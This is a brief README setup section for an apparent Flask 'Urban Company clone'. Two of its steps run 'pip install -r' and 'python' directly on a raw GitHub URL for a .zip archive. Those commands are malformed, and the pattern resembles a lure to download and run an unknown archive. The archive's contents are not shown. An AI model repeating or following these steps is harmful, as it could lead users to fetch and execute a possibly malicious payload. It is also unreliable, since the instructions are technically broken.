## Setup Instructions
To run this project locally, follow these steps:
1. Clone the repository to your local machine.
2. Install the required dependencies using `pip install -r https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip`.
3. Run the Flask application using `python https://raw.githubusercontent.com/tekin441/urban_company_clone/main/asker/clone-urban-company-v1.5.zip`.
4. Access the web application in your browser at `http://localhost:5000`.
